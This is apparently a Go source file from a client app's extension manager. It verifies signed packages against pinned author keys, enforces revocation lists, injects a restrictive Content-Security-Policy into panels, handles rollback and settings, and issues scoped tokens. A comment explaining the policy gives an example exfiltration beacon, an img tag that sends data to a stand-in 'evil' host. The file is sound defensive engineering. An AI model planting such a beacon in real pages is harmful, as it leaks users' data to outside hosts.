package ext

import (
	"bytes"
	"crypto/rand"
	"crypto/subtle"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/levvs-one/sora-client/core/errs"
)

// Sources of an installed extension.
const (
	SourceCatalog  = "catalog"
	SourceSideload = "sideload"
	SourceURL      = "url"
)

// TokenLen is the per-extension token length in bytes.
//
// TokenTTL bounds a token's lifetime. Tokens live in memory only, so a core
// restart already invalidates them; the TTL additionally bounds the damage
// of a leaked token (e.g. copied out of a compromised panel process) to one
// day. The app is expected to mint fresh tokens at startup and may rotate
// them proactively; rotation is cheap and revocation stays immediate via
// Revoke/RevoteByExtension.
const TokenLen = 32

// TokenTTL is the maximum age of a per-extension token.
const TokenTTL = 24 * time.Hour

// Installed is one extension on disk.
type Installed struct {
	Manifest    Manifest  `json:"manifest"`
	Version     string    `json:"version"`
	Enabled     bool      `json:"enabled"`
	Source      string    `json:"source"`
	InstalledAt time.Time `json:"installed_at"`
	// Granted are the permissions the user accepted.
	Granted []string `json:"granted"`
	// Previous keeps the N-1 version directory name for rollback.
	Previous string `json:"previous,omitempty"`
	// AuthorKey is the pinned author public key (the minisign .pub line):
	// the catalog-pinned key for catalog installs, the manifest's
	// self-attested key otherwise (trust on first use). Updates must carry
	// the same key - a changed key is refused, never silently adopted
	// (key continuity, D2). Omitted in registries written before pinning;
	// reads fall back to the manifest's key for those.
	AuthorKey string `json:"author_key,omitempty"`
	// ExtJSON carries the raw v2-runtime manifest fields
	// (background_task, network_hosts) so Rollback can restore them from
	// the registry without re-reading the package. Omitted when the
	// extension declares none; old registries without it still load.
	ExtJSON json.RawMessage `json:"ext_json,omitempty"`
}

// registryFile is the installed.json inside the extensions directory.
const registryFile = "installed.json"

// Store owns the extension lifecycle on disk.
type Store struct {
	mu        sync.Mutex
	dir       string // <datadir>/extensions
	installed map[string]*Installed
	issuer    *TokenIssuer
	// revocations is the latest verified revocation list, or nil when the
	// app has not fetched one yet. Guarded by mu.
	revocations *RevocationList
}

// SetRevocations installs a verified revocation list (see
// VerifyRevocationList). Passing nil clears it.
func (s *Store) SetRevocations(l *RevocationList) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.revocations = l
}

// checkRevocationsLocked enforces the revocation policy for an
// install/update/enable of id@version. Callers must hold s.mu.
func (s *Store) checkRevocationsLocked(id, version string) error {
	l := s.revocations
	if l == nil {
		// No list, no intel: the catalog signature is the primary gate.
		return nil
	}
	if l.Expired(time.Now()) {
		return errs.Newf(errs.CodeUnavailable, KeyRevocationInvalid,
			"ext: the revocation list expired at %s and cannot be refreshed offline - installs are blocked until it is renewed",
			l.ExpiresAt.UTC().Format(time.RFC3339))
	}
	if l.IsRevoked(id, version) {
		return errs.Newf(errs.CodePermissionDenied, KeyRevocationInvalid,
			"ext: %s@%s was revoked by the Sora team and cannot be installed or enabled", id, version)
	}
	return nil
}

// OpenStore loads the extension registry from dir, creating it if needed.
func OpenStore(dir string) (*Store, error) {
	if strings.TrimSpace(dir) == "" {
		return nil, errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: no directory for the extension store")
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot create the extension directory: %v", err)
	}
	s := &Store{dir: dir, installed: map[string]*Installed{}, issuer: NewTokenIssuer()}
	raw, err := os.ReadFile(filepath.Join(dir, registryFile)) //nolint:gosec // fixed name inside the store dir
	if err != nil {
		if os.IsNotExist(err) {
			// No registry yet: still sweep debris from a crashed first
			// install before handing the store out.
			s.collectOrphans()
			return s, nil
		}
		return nil, errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot read the extension registry: %v", err)
	}
	var reg map[string]*Installed
	if err := json.Unmarshal(raw, &reg); err != nil {
		return nil, errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: the extension registry is corrupt: %v", err)
	}
	for id, inst := range reg {
		if inst == nil {
			continue
		}
		s.installed[id] = inst
	}
	// Crash recovery: an install killed between extract and registry save
	// leaves a version directory the registry never adopted. Remove those
	// orphans (and stale temp files) so a later install starts clean and
	// the directory does not fill with dead weight.
	s.collectOrphans()
	return s, nil
}

// collectOrphans removes version directories ("id@version") that no
// installed extension references, plus leftover "*.tmp" files. The registry
// is the source of truth; anything else in the directory is debris from a
// crash or a killed install.
func (s *Store) collectOrphans() {
	keep := map[string]bool{}
	for id, inst := range s.installed {
		keep[s.extDir(id, inst.Version)] = true
		if inst.Previous != "" {
			keep[s.extDir(id, inst.Previous)] = true
		}
	}
	entries, err := os.ReadDir(s.dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		name := e.Name()
		full := filepath.Join(s.dir, name)
		if strings.HasSuffix(name, ".tmp") {
			_ = os.Remove(full)
			continue
		}
		if !e.IsDir() || !strings.Contains(name, "@") {
			continue
		}
		if !keep[full] {
			_ = os.RemoveAll(full)
		}
	}
}

// saveLocked persists the registry atomically.
func (s *Store) saveLocked() error {
	raw, err := json.MarshalIndent(s.installed, "", "  ")
	if err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot encode the extension registry: %v", err)
	}
	tmp := filepath.Join(s.dir, registryFile+".tmp")
	if err := os.WriteFile(tmp, raw, 0o600); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot write the extension registry: %v", err)
	}
	if err := os.Rename(tmp, filepath.Join(s.dir, registryFile)); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot replace the extension registry: %v", err)
	}
	return nil
}

// extDir returns the content directory for id@version.
func (s *Store) extDir(id, version string) string {
	return filepath.Join(s.dir, id+"@"+version)
}

// Install verifies pkg and installs it. granted must cover every permission
// in the manifest; the caller is expected to have shown the permission
// prompt (and any re-prompt for widened permissions) before calling.
//
// authorKeyPin carries the catalog-pinned author key for catalog installs
// (source == SourceCatalog) and is required then: the package signature is
// verified against the pin, never against the manifest's self-attested
// key, and the pin becomes the extension's trust anchor. For other sources
// the pin is ignored and the manifest's key is trusted on first use.
// For an update it returns the permissions added relative to the previous
// version, so the caller can surface what changed.
func (s *Store) Install(pkg *Package, source string, granted []string, authorKeyPin string) (added []string, err error) {
	if pkg == nil || pkg.Manifest == nil {
		return nil, errs.Newf(errs.CodeInvalidArgument, KeyPackageInvalid, "ext: no package")
	}
	m := pkg.Manifest
	// D1: catalog packages are verified against the catalog-pinned author
	// key. The manifest's embedded key is self-attested - verifying
	// against it would let a package smuggle in its own trust anchor.
	verifyKey := m.Author.PublicKey
	if source == SourceCatalog {
		if strings.TrimSpace(authorKeyPin) == "" {
			return nil, errs.Newf(errs.CodeInvalidArgument, KeyAuthorKeyChanged,
				"ext: a catalog install of %q needs the catalog-pinned author key", m.ID)
		}
		verifyKey = authorKeyPin
	}
	if err := pkg.VerifyWithKey(verifyKey); err != nil {
		return nil, err
	}
	for _, g := range granted {
		if !IsKnownPermission(g) {
			return nil, errs.Newf(errs.CodeInvalidArgument, KeyPermissionDenied, "ext: unknown granted permission %q", g)
		}
	}
	// Granted must cover the manifest's permissions.
	need := map[string]bool{}
	for _, p := range m.Permissions {
		need[p] = true
	}
	for _, g := range granted {
		delete(need, g)
	}
	if len(need) > 0 {
		missing := make([]string, 0, len(need))
		for p := range need {
			missing = append(missing, p)
		}
		sort.Strings(missing)
		return nil, errs.Newf(errs.CodeInvalidArgument, KeyPermissionDenied,
			"ext: the install does not grant required permissions: %s", strings.Join(missing, ", "))
	}

	s.mu.Lock()
	defer s.mu.Unlock()
	if err := s.checkRevocationsLocked(m.ID, m.Version); err != nil {
		return nil, err
	}
	cur, updating := s.installed[m.ID]
	if updating {
		if CompareVersions(m.Version, cur.Version) <= 0 {
			return nil, errs.Newf(errs.CodeInvalidArgument, KeyLifecycle,
				"ext: version %s is not newer than installed %s", m.Version, cur.Version)
		}
		// D2: author-key continuity. An update signed by a different key
		// than the pinned one is refused outright - a silent substitution
		// of the trust anchor (id squatting, catalog -> sideload
		// cross-source swaps) must never happen. The user can still get
		// the new build by uninstalling and installing it explicitly.
		pinned := cur.AuthorKey
		if pinned == "" {
			// Registries written before pinning: the previously
			// installed manifest's key is the anchor.
			pinned = cur.Manifest.Author.PublicKey
		}
		if !sameAuthorKey(m.Author.PublicKey, pinned) {
			return nil, errs.Newf(errs.CodeUnauthenticated, KeyAuthorKeyChanged,
				"ext: the author key of %q changed - refusing the update", m.ID)
		}
		added, _ = DiffPermissions(cur.Granted, granted)
	}
	if err := s.extractLocked(m, pkg); err != nil {
		// A failed extract must not leave a half-written version behind:
		// the registry still points at the previous version, and a later
		// retry starts from a clean directory.
		_ = os.RemoveAll(s.extDir(m.ID, m.Version))
		return nil, err
	}
	previous := ""
	enabled := true
	installedAt := time.Now().UTC()
	// The trust anchor: the catalog pin for catalog installs, the
	// manifest's self-attested key otherwise (trust on first use). Updates
	// keep the previously pinned key; a changed key was refused above.
	storedPin := m.Author.PublicKey
	if source == SourceCatalog {
		storedPin = authorKeyPin
	}
	if updating {
		previous = cur.Version
		enabled = cur.Enabled
		installedAt = cur.InstalledAt
		storedPin = cur.AuthorKey
		if storedPin == "" {
			storedPin = cur.Manifest.Author.PublicKey
		}
	}
	s.installed[m.ID] = &Installed{
		Manifest:    *m,
		Version:     m.Version,
		Enabled:     enabled,
		Source:      source,
		InstalledAt: installedAt,
		Granted:     append([]string(nil), granted...),
		Previous:    previous,
		AuthorKey:   storedPin,
		ExtJSON:     marshalManifestExt(pkg.ManifestExt),
	}
	if err := s.saveLocked(); err != nil {
		return nil, err
	}
	return added, nil
}

// sameAuthorKey compares two minisign .pub lines for the continuity
// check. Comparison is on the trimmed lines: base64 is case-sensitive, so
// only surrounding whitespace is forgiven, never key content.
func sameAuthorKey(a, b string) bool {
	return strings.TrimSpace(a) == strings.TrimSpace(b)
}

// marshalManifestExt serializes the v2-runtime manifest fields for the
// registry. Nil (no v2 fields declared) stays nil and is omitted.
func marshalManifestExt(x *ManifestExt) json.RawMessage {
	if x == nil {
		return nil
	}
	raw, err := json.Marshal(x)
	if err != nil {
		return nil
	}
	if string(raw) == "{}" || string(raw) == "null" {
		return nil
	}
	return raw
}

// extractLocked writes the package content to id@version.
func (s *Store) extractLocked(m *Manifest, pkg *Package) error {
	dst := s.extDir(m.ID, m.Version)
	if err := os.MkdirAll(dst, 0o700); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot create the extension directory: %v", err)
	}
	// Only the files declared as panel entries get the CSP treatment; every
	// other file lands on disk byte-identical to the signed package.
	panelEntries := map[string]bool{}
	if m.UI != nil {
		for _, p := range m.UI.Panels {
			panelEntries[p.Entry] = true
		}
	}
	names := make([]string, 0, len(pkg.Files))
	for n := range pkg.Files {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		target := filepath.Join(dst, filepath.FromSlash(n))
		// Belt and suspenders: the archive paths were validated, but never
		// trust a join without re-checking containment.
		if !strings.HasPrefix(target, dst+string(os.PathSeparator)) {
			return errs.Newf(errs.CodeInternal, KeyPackageInvalid, "ext: unsafe extract path %q", n)
		}
		if err := os.MkdirAll(filepath.Dir(target), 0o700); err != nil {
			return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot create %q: %v", n, err)
		}
		data := pkg.Files[n]
		if panelEntries[n] {
			data = injectPanelCSP(data)
		}
		if err := os.WriteFile(target, data, 0o600); err != nil {
			return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot write %q: %v", n, err)
		}
	}
	return nil
}

// panelCSP is the lockdown policy for extension panels. Panels are embedded
// WebViews whose only sanctioned way out is the host API (net.fetch through
// the core, the JS bridge to core RPCs): a panel must never make its own
// network requests, or a compromised panel exfiltrates data with a single
// request.
//
// connect-src 'none' alone is NOT enough: it blocks only fetch/XHR,
// WebSocket, EventSource and beacons. Subresource loads (images, media,
// fonts, styles, workers) use their own directives, so the policy locks
// those to the panel's own origin as well - an exfiltration beacon such as
// <img src="https://evil/?d=..."> is refused while the panel's own bundled
// assets (served from the loopback server, i.e. 'self') keep working.
// The meta tag is injected after signature verification, into the
// extracted copies only; the signed package is untouched. When the author
// shipped their own CSP meta tag, both policies apply and intersect, so the
// injected one can only ever tighten. (frame-ancestors is omitted: it is
// ignored in meta tags; the serving HTTP header enforces it.)
const panelCSP = `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; media-src 'self'; font-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'">`

// injectPanelCSP inserts the panel CSP meta tag into html: right after the
// opening <head> when one is present, otherwise at the very start of the
// document. Idempotent per extraction: the input is always the pristine
// package bytes, never an already-injected copy.
func injectPanelCSP(html []byte) []byte {
	// Find the first "<head" case-insensitively without lowercasing a full
	// copy of the document: bytes.ToLower allocated len(html) on top of the
	// output copy (~2x the panel size in total allocations). "<head" is
	// pure ASCII, so a byte-wise EqualFold scan finds exactly what the
	// lowercased search found.
	if i := indexHeadTag(html); i >= 0 {
		if j := bytes.IndexByte(html[i:], '>'); j >= 0 {
			at := i + j + 1
			out := make([]byte, 0, len(html)+len(panelCSP))
			out = append(out, html[:at]...)
			out = append(out, panelCSP...)
			out = append(out, html[at:]...)
			return out
		}
	}
	out := make([]byte, 0, len(html)+len(panelCSP))
	out = append(out, panelCSP...)
	out = append(out, html...)
	return out
}

// indexHeadTag returns the offset of the first "<head" in html, matched
// ASCII case-insensitively, or -1. It allocates nothing.
func indexHeadTag(html []byte) int {
	for i := 0; i+5 <= len(html); i++ {
		if html[i] == '<' && bytes.EqualFold(html[i+1:i+5], []byte("head")) {
			return i
		}
	}
	return -1
}

// readVersionFiles walks an extracted version directory and returns every
// file keyed by its slash-separated path relative to dir (the archive
// layout), so a previous version kept on disk can be re-verified as a
// Package before rollback restores it.
func readVersionFiles(dir string) (map[string][]byte, error) {
	files := map[string][]byte{}
	err := filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(dir, p)
		if err != nil {
			return err
		}
		data, err := os.ReadFile(p) //nolint:gosec // p stays inside the store dir
		if err != nil {
			return err
		}
		files[filepath.ToSlash(rel)] = data
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

// Rollback restores the N-1 version kept at install time.
//
// The previous manifest is re-read from its directory on disk (the source
// of truth) with ParseManifestFull, restoring both the v1 manifest and the
// v2-runtime fields. The registry's Manifest belongs to the bad version
// being dropped: keeping it would leave the app showing the new version's
// panels, settings schema and permissions while serving the old version's
// files.
func (s *Store) Rollback(id string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	cur, ok := s.installed[id]
	if !ok {
		return errs.Newf(errs.CodeNotFound, KeyLifecycle, "ext: %q is not installed", id)
	}
	if cur.Previous == "" {
		return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: %q has no previous version to roll back to", id)
	}
	prevDir := s.extDir(id, cur.Previous)
	if st, err := os.Stat(prevDir); err != nil || !st.IsDir() {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: the previous version of %q is missing on disk", id)
	}
	// Read the previous manifest before touching anything: a corrupt or
	// unreadable previous version must fail the rollback, not brick the
	// install. ParseManifestFull restores the v2-runtime fields as well.
	manRaw, err := os.ReadFile(filepath.Join(prevDir, manifestName)) //nolint:gosec // fixed name inside the store dir
	if err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot read the previous manifest of %q: %v", id, err)
	}
	prevManifest, prevExt, err := ParseManifestFull(manRaw)
	if err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: the previous manifest of %q is invalid: %v", id, err)
	}
	if prevManifest.ID != id || prevManifest.Version != cur.Previous {
		return errs.Newf(errs.CodeInternal, KeyLifecycle,
			"ext: the previous manifest of %q does not match version %s", id, cur.Previous)
	}
	// Re-verify the previous version before restoring it: the N-1
	// directory is not integrity-checked after install, so a tampered
	// previous version must fail the rollback (fail closed) rather than
	// become the served version. The panel CSP injected at extract time
	// is stripped first - verification is against the signed bytes. The
	// trust anchor is the pinned author key, never the on-disk manifest's
	// self-attested key.
	pinned := cur.AuthorKey
	if pinned == "" {
		pinned = cur.Manifest.Author.PublicKey
	}
	prevFiles, err := readVersionFiles(prevDir)
	if err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle,
			"ext: cannot read the previous version of %q: %v", id, err)
	}
	panelEntries := map[string]bool{}
	if prevManifest.UI != nil {
		for _, p := range prevManifest.UI.Panels {
			panelEntries[p.Entry] = true
		}
	}
	for name, data := range prevFiles {
		if panelEntries[name] {
			prevFiles[name] = bytes.Replace(data, []byte(panelCSP), nil, 1)
		}
	}
	prevPkg := &Package{Files: prevFiles, Manifest: prevManifest}
	if err := prevPkg.VerifyWithKey(pinned); err != nil {
		return errs.Newf(errs.CodeUnauthenticated, KeySignatureInvalid,
			"ext: the previous version of %q failed its integrity re-check - refusing rollback: %v", id, err)
	}
	// Drop the bad version's directory, keep the previous one.
	if err := os.RemoveAll(s.extDir(id, cur.Version)); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot remove the bad version of %q: %v", id, err)
	}
	cur.Version = cur.Previous
	cur.Previous = ""
	cur.Manifest = *prevManifest
	cur.Manifest.Version = cur.Version
	cur.ExtJSON = marshalManifestExt(prevExt)
	s.issuer.RevokeByExtension(id)
	return s.saveLocked()
}

// SetEnabled enables or disables an extension in one tap. Disabling revokes
// its host tokens immediately: panels lose core access at once.
func (s *Store) SetEnabled(id string, enabled bool) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	cur, ok := s.installed[id]
	if !ok {
		return errs.Newf(errs.CodeNotFound, KeyLifecycle, "ext: %q is not installed", id)
	}
	if enabled {
		if err := s.checkRevocationsLocked(id, cur.Version); err != nil {
			return err
		}
	}
	cur.Enabled = enabled
	if !enabled {
		s.issuer.RevokeByExtension(id)
	}
	return s.saveLocked()
}

// Uninstall removes an extension, its previous version, settings, background
// config and tokens.
func (s *Store) Uninstall(id string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	cur, ok := s.installed[id]
	if !ok {
		return errs.Newf(errs.CodeNotFound, KeyLifecycle, "ext: %q is not installed", id)
	}
	for _, v := range []string{cur.Version, cur.Previous} {
		if v == "" {
			continue
		}
		if err := os.RemoveAll(s.extDir(id, v)); err != nil {
			return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot remove %q: %v", id, err)
		}
	}
	if err := os.RemoveAll(s.settingsPath(id)); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot remove the settings of %q: %v", id, err)
	}
	// The background override is a per-extension runtime file like the
	// settings; leaving it behind would resurrect the user's schedule on
	// reinstall (mirrors the Dart ExtensionStore.uninstall).
	if err := os.Remove(s.backgroundPath(id)); err != nil && !os.IsNotExist(err) {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot remove the background config of %q: %v", id, err)
	}
	s.issuer.RevokeByExtension(id)
	delete(s.installed, id)
	return s.saveLocked()
}

// List returns a snapshot of installed extensions, sorted by id.
func (s *Store) List() []Installed {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Installed, 0, len(s.installed))
	for _, inst := range s.installed {
		out = append(out, *inst)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Manifest.ID < out[j].Manifest.ID })
	return out
}

// Get returns one installed extension.
func (s *Store) Get(id string) (*Installed, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	inst, ok := s.installed[id]
	if !ok {
		return nil, false
	}
	cp := *inst
	return &cp, true
}

// ContentDir returns the on-disk directory of an installed version, for the
// app to load panels from. Empty when not installed.
func (s *Store) ContentDir(id string) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	inst, ok := s.installed[id]
	if !ok {
		return ""
	}
	return s.extDir(id, inst.Version)
}

// settingsPath is the per-extension settings file.
func (s *Store) settingsPath(id string) string {
	return filepath.Join(s.dir, id+".settings.json")
}

// GetSettings returns the extension's settings (defaults merged from the
// schema when the file is absent).
func (s *Store) GetSettings(id string) (map[string]any, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	inst, ok := s.installed[id]
	if !ok {
		return nil, errs.Newf(errs.CodeNotFound, KeyLifecycle, "ext: %q is not installed", id)
	}
	out := schemaDefaults(inst.Manifest.SettingsSchema)
	raw, err := os.ReadFile(s.settingsPath(id)) //nolint:gosec // fixed suffix inside the store dir
	if err != nil {
		if os.IsNotExist(err) {
			return out, nil
		}
		return nil, errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot read the settings of %q: %v", id, err)
	}
	var stored map[string]any
	if err := json.Unmarshal(raw, &stored); err != nil {
		// Corrupt settings must not brick the extension: fall back to
		// defaults and let the next save repair the file.
		return out, nil
	}
	for k, v := range stored {
		out[k] = v
	}
	return out, nil
}

// SetSettings validates values against the manifest's settings_schema and
// merges them into the stored settings: keys not mentioned keep their
// stored values. Unknown keys and type violations are rejected. Merge is
// the documented panel contract (docs/extensions.md shows
// setSettings({refresh_seconds: 10}) as a one-key write) and the mock's
// behavior; the app settings form passes the full form map, which merges
// to the same result. The Dart mirror (app/lib/src/ext/store.dart
// setSettings) implements the same semantics.
func (s *Store) SetSettings(id string, values map[string]any) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	inst, ok := s.installed[id]
	if !ok {
		return errs.Newf(errs.CodeNotFound, KeyLifecycle, "ext: %q is not installed", id)
	}
	if err := validateSettingsValues(inst.Manifest.SettingsSchema, values); err != nil {
		return err
	}
	merged := map[string]any{}
	if raw, err := os.ReadFile(s.settingsPath(id)); err == nil { //nolint:gosec // fixed suffix inside the store dir
		// A corrupt stored file repairs like GetSettings: start from
		// empty rather than bricking every future save. A stored "null"
		// is valid JSON but not a settings object: Unmarshal succeeds
		// and leaves merged nil, and assigning into a nil map would
		// panic the merge - it repairs to empty exactly like corruption.
		if err := json.Unmarshal(raw, &merged); err != nil || merged == nil {
			merged = map[string]any{}
		}
	}
	for k, v := range values {
		merged[k] = v
	}
	raw, err := json.MarshalIndent(merged, "", "  ")
	if err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot encode the settings of %q: %v", id, err)
	}
	// Atomic write: a crash mid-save must not leave a half-written
	// settings file behind.
	tmp := s.settingsPath(id) + ".tmp"
	if err := os.WriteFile(tmp, raw, 0o600); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot save the settings of %q: %v", id, err)
	}
	if err := os.Rename(tmp, s.settingsPath(id)); err != nil {
		_ = os.Remove(tmp)
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot save the settings of %q: %v", id, err)
	}
	return nil
}

// schemaDefaults extracts "default" values from the settings schema.
func schemaDefaults(schema json.RawMessage) map[string]any {
	out := map[string]any{}
	if len(schema) == 0 {
		return out
	}
	var obj map[string]any
	if err := json.Unmarshal(schema, &obj); err != nil {
		return out
	}
	props, _ := obj["properties"].(map[string]any)
	for name, raw := range props {
		prop, _ := raw.(map[string]any)
		if prop == nil {
			continue
		}
		if d, ok := prop["default"]; ok {
			out[name] = d
		}
	}
	return out
}

// validateSettingsValues checks values against the schema's properties.
func validateSettingsValues(schema json.RawMessage, values map[string]any) error {
	if len(schema) == 0 {
		if len(values) > 0 {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle,
				"ext: this extension has no settings, but %d were given", len(values))
		}
		return nil
	}
	var obj map[string]any
	if err := json.Unmarshal(schema, &obj); err != nil {
		return errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: the settings schema is unreadable")
	}
	props, _ := obj["properties"].(map[string]any)
	for name, v := range values {
		raw, ok := props[name]
		if !ok {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: unknown setting %q", name)
		}
		prop, _ := raw.(map[string]any)
		if prop == nil {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: bad schema for setting %q", name)
		}
		if err := checkValueType(name, prop, v); err != nil {
			return err
		}
	}
	return nil
}

func checkValueType(name string, prop map[string]any, v any) error {
	want, _ := prop["type"].(string)
	switch want {
	case "string":
		s, ok := v.(string)
		if !ok {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q must be a string", name)
		}
		if maximum, ok := toFloat(prop["maxLength"]); ok && float64(len(s)) > maximum {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q is too long", name)
		}
		if minimum, ok := toFloat(prop["minLength"]); ok && float64(len(s)) < minimum {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q is too short", name)
		}
	case "integer":
		f, ok := toFloat(v)
		if !ok || f != float64(int64(f)) {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q must be an integer", name)
		}
		if err := checkRange(name, prop, f); err != nil {
			return err
		}
	case "number":
		f, ok := toFloat(v)
		if !ok {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q must be a number", name)
		}
		if err := checkRange(name, prop, f); err != nil {
			return err
		}
	case "boolean":
		if _, ok := v.(bool); !ok {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q must be true or false", name)
		}
	default:
		return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q has an unsupported type", name)
	}
	if enum, ok := prop["enum"].([]any); ok {
		found := false
		for _, e := range enum {
			if fmt.Sprintf("%v", e) == fmt.Sprintf("%v", v) {
				found = true
				break
			}
		}
		if !found {
			return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q has a disallowed value", name)
		}
	}
	return nil
}

func checkRange(name string, prop map[string]any, f float64) error {
	if maximum, ok := toFloat(prop["maximum"]); ok && f > maximum {
		return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q is too large", name)
	}
	if minimum, ok := toFloat(prop["minimum"]); ok && f < minimum {
		return errs.Newf(errs.CodeInvalidArgument, KeyLifecycle, "ext: setting %q is too small", name)
	}
	return nil
}

func toFloat(v any) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case float32:
		return float64(n), true
	case int:
		return float64(n), true
	case int64:
		return float64(n), true
	case json.Number:
		f, err := n.Float64()
		return f, err == nil
	}
	return 0, false
}

// Grant is what a verified token carries.
type Grant struct {
	ExtensionID string
	Permissions map[string]bool
	// IssuedAt/ExpiresAt bound the token's lifetime (see TokenTTL).
	IssuedAt  time.Time
	ExpiresAt time.Time
}

// Expired reports whether the grant is past its TTL.
func (g *Grant) Expired(now time.Time) bool {
	return !g.ExpiresAt.After(now)
}

// TokenIssuer mints and verifies per-extension tokens scoped to granted
// permissions. Tokens live in memory only: a core restart invalidates them,
// and the app mints fresh ones for enabled extensions at startup.
type TokenIssuer struct {
	mu     sync.Mutex
	tokens map[string]*Grant // base64(token) -> grant
}

// NewTokenIssuer returns an empty issuer.
func NewTokenIssuer() *TokenIssuer {
	return &TokenIssuer{tokens: map[string]*Grant{}}
}

// Mint creates a token for an enabled extension with exactly perms.
// The token expires after TokenTTL; Verify rejects expired tokens.
func (t *TokenIssuer) Mint(extensionID string, perms []string) (string, error) {
	if strings.TrimSpace(extensionID) == "" {
		return "", errs.Newf(errs.CodeInvalidArgument, KeyPermissionDenied, "ext: empty extension id")
	}
	raw := make([]byte, TokenLen)
	if _, err := rand.Read(raw); err != nil {
		return "", errs.Newf(errs.CodeInternal, KeyLifecycle, "ext: cannot mint a token: %v", err)
	}
	now := time.Now()
	g := &Grant{
		ExtensionID: extensionID,
		Permissions: map[string]bool{},
		IssuedAt:    now,
		ExpiresAt:   now.Add(TokenTTL),
	}
	for _, p := range perms {
		if !IsKnownPermission(p) {
			return "", errs.Newf(errs.CodeInvalidArgument, KeyPermissionDenied, "ext: unknown permission %q", p)
		}
		g.Permissions[p] = true
	}
	enc := base64.RawStdEncoding.EncodeToString(raw)
	t.mu.Lock()
	t.sweepLocked(now)
	t.tokens[enc] = g
	t.mu.Unlock()
	return enc, nil
}

// sweepLocked drops expired tokens. Callers must hold t.mu.
func (t *TokenIssuer) sweepLocked(now time.Time) {
	for k, g := range t.tokens {
		if g.Expired(now) {
			delete(t.tokens, k)
		}
	}
}

// Verify checks a token and returns its grant. Expired tokens are rejected
// and dropped. Comparison is constant-time over the stored keys to avoid
// oracle behavior.
func (t *TokenIssuer) Verify(token string) (*Grant, bool) {
	now := time.Now()
	t.mu.Lock()
	defer t.mu.Unlock()
	for k, g := range t.tokens {
		if subtle.ConstantTimeCompare([]byte(k), []byte(token)) == 1 {
			if g.Expired(now) {
				delete(t.tokens, k)
				return nil, false
			}
			return g, true
		}
	}
	return nil, false
}

// Revoke drops one token.
func (t *TokenIssuer) Revoke(token string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	for k := range t.tokens {
		if subtle.ConstantTimeCompare([]byte(k), []byte(token)) == 1 {
			delete(t.tokens, k)
		}
	}
}

// RevokeByExtension drops every token of an extension (disable/uninstall/
// rollback): one tap cuts core access immediately.
func (t *TokenIssuer) RevokeByExtension(extensionID string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	for k, g := range t.tokens {
		if g.ExtensionID == extensionID {
			delete(t.tokens, k)
		}
	}
}

// Issuer exposes the store's token issuer for the host service wiring.
func (s *Store) Issuer() *TokenIssuer { return s.issuer }
